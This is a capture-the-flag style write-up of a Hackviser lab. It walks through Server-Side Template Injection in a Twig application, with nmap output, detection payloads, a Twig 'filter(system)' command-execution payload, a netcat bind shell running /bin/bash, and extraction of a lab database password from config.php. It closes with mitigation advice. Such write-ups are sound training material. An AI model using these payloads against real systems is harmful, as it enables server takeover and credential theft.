---
title: "Leaf: SSTI → Template Engine Identification → Bind Shell → Data Exposure"
date: 2026-03-29 23:50:00 +0530
categories: [Hackviser, Easy]
tags: [ssti, twig, rce, bind-shell, web-exploitation]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/ssti.webp
  alt: Server-Side Template Injection Exploitation
---

## Overview

This lab demonstrates how **Server-Side Template Injection (SSTI)** can lead to full server compromise.

The attack chain includes:

- SSTI detection
- Template engine identification
- Remote command execution
- Bind shell access
- Sensitive data extraction

---

## Objective

- Identify SSTI vulnerability
- Determine template engine
- Execute system commands
- Establish shell access
- Extract sensitive information

---

## Reconnaissance

Scan the target for open services:

```bash
nmap -sV <target_ip>
```

**Output**

```
┌──(root㉿kali)-[/home/kelvin/Desktop]
└─# nmap -sV 172.20.6.12
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 12:06 -0400
Nmap scan report for 172.20.6.12 (172.20.6.12)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)

Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds
```

Open services:

- Port **80** — HTTP (Apache)
- Port **3306** — MySQL

---

## Initial Enumeration

Directory brute-forcing did not reveal useful endpoints:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/big.txt
```

However, the web application allows unauthenticated user comments on products.

---

## SSTI Detection

Test for SSTI using a simple payload:

{% raw %}
```
{{7*7}}
```
{% endraw %}

**Result**

```
49
```

This confirms that user input is being evaluated by a template engine.

---

## Template Engine Identification

Test behavior with string multiplication:

{% raw %}
```
{{7*'7'}}
```
{% endraw %}

**Result**

```
49
```

**Analysis**

| Engine | Expected Output |
|--------|-----------------|
| Jinja2 | `7777777`       |
| Twig   | `49`            |

Since the result is `49`, the application is using **Twig**.

---

## Remote Code Execution via SSTI

Twig allows execution of system commands using filters.

**Payload**

{% raw %}
```
{{['<command>']|filter('system')}}
```
{% endraw %}

This enables execution of arbitrary commands on the server.

---

## Bind Shell Setup

Start a bind shell on the target:

{% raw %}
```
{{['nc -nvlp 1337 -e /bin/bash']|filter('system')}}
```
{% endraw %}

**Netcat Options**

| Flag | Description        |
|------|--------------------|
| `-l` | Listen mode        |
| `-v` | Verbose            |
| `-n` | No DNS resolution  |
| `-p` | Port number        |

### Shell Access

Connect from attacker machine:

```bash
nc -nv <target_ip> 1337
```

**Result**

```
(UNKNOWN) [172.20.6.12] 1337 (?) open
ls
Chart.bundle.min.js
blank.png
bootstrap-icons.css
bundle.min.js
comment.php
composer.json
composer.lock
config.php
css
index.php
js
product.php
products
vendor
```

---

## Sensitive Data Extraction

Inspect configuration file:

```bash
cat config.php
```

**Output**

```php
$host = "localhost";
$dbname = "modish_tech";
$username = "root";
$password = "7tRy-zSmF-1143";
```

---

## Proof of Exploitation

- SSTI vulnerability identified
- Template engine confirmed as Twig
- Remote command execution achieved
- Bind shell established
- Sensitive database credentials extracted

---

## Attack Chain Summary

1. Service enumeration (Nmap)
2. Identify input point (comments)
3. SSTI detection ({% raw %}`{{7*7}}`{% endraw %})
4. Template engine fingerprinting (Twig)
5. Command execution via SSTI
6. Bind shell creation (Netcat)
7. Remote shell access
8. Credential extraction (`config.php`)

---

## Impact

- Remote Code Execution (RCE)
- Full server access via shell
- Exposure of database credentials
- Potential database compromise
- High risk of complete system takeover

---

## Mitigation

- Avoid rendering unsanitized user input in templates
- Use safe template rendering practices
- Disable dangerous functions/filters (like `system`)
- Apply strict input validation and escaping
- Use sandboxed template environments
- Restrict outbound and inbound network access

---

## Real-World Insight

SSTI is one of the most dangerous web vulnerabilities because it directly leads to server-side execution.

Common exploitation path:

> Input field → SSTI → RCE → Shell → Data exfiltration

Unlike client-side issues, SSTI gives attackers control over the backend itself.

Always test:

- {% raw %}`{{7*7}}`{% endraw %}
- {% raw %}`{{7*'7'}}`{% endraw %}
- Template-specific payloads

A single overlooked input field can lead to full infrastructure compromise.